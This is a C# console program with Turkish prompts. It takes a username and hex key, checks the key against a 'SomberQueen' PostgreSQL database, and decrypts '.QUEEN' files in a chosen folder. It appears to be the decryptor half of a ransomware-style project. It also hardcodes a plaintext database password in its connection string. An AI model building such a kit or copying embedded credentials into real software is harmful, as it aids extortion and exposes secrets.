using System;
using System.IO;
using SomberDecryptor.Utilities;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            string connectionString = "Host=localhost;Port=5432;Database=SomberQueen;Username=postgres;Password=TfxZ.8BPiztV6b";
            var dbHelper = new DBHelper(connectionString);
            
            Console.Write("Kullanıcı adınızı girin: ");
            string username = Console.ReadLine();

            if (string.IsNullOrWhiteSpace(username))
            {
                Console.WriteLine("Geçersiz kullanıcı adı!");
                return;
            }

            Console.WriteLine("\nSomberDecryptor - Dosya Şifre Çözme Uygulaması");
            Console.WriteLine("----------------------------------------");

            Console.Write("\nŞifre çözme anahtarını girin (örn: E0E609...): ");
            string hexKey = Console.ReadLine().ToUpper();

            if (!dbHelper.ValidateDecryptionKey(username, hexKey))
            {
                Console.WriteLine("Geçersiz şifre çözme anahtarı!");
                return;
            }

            byte[] key = new byte[hexKey.Length / 2];
            for (int i = 0; i < key.Length; i++)
            {
                key[i] = Convert.ToByte(hexKey.Substring(i * 2, 2), 16);
            }

            Console.Write("\nŞifreli dosyaların bulunduğu klasörü girin: ");
            string inputDirectory = Console.ReadLine();

            if (!Directory.Exists(inputDirectory))
            {
                Console.WriteLine("Klasör bulunamadı!");
                return;
            }

            string[] encryptedFiles = Directory.GetFiles(inputDirectory, "*.QUEEN", SearchOption.AllDirectories);

            if (encryptedFiles.Length == 0)
            {
                Console.WriteLine("Klasörde şifrelenmiş dosya bulunamadı!");
                return;
            }

            Console.WriteLine($"\nToplam {encryptedFiles.Length} şifreli dosya bulundu.");
            Console.WriteLine("Şifre çözme işlemi başlıyor...\n");

            int successCount = 0;
            foreach (string encryptedFile in encryptedFiles)
            {
                try
                {
                    string outputFile = encryptedFile.Substring(0, encryptedFile.Length - 6);

                    Console.Write($"Çözülüyor: {Path.GetFileName(encryptedFile)} -> {Path.GetFileName(outputFile)} ... ");

                    DecryptionService.DecryptFile(encryptedFile, outputFile, key);
                    
                    Console.WriteLine("Başarılı!");
                    successCount++;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Hata! ({ex.Message})");
                }
            }

            Console.WriteLine($"\nİşlem tamamlandı!");
            Console.WriteLine($"Toplam: {encryptedFiles.Length} dosya");
            Console.WriteLine($"Başarılı: {successCount} dosya");
            Console.WriteLine($"Başarısız: {encryptedFiles.Length - successCount} dosya");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"\nHata oluştu: {ex.Message}");
        }

        Console.WriteLine("\nÇıkmak için bir tuşa basın...");
        Console.ReadKey();
    }
}
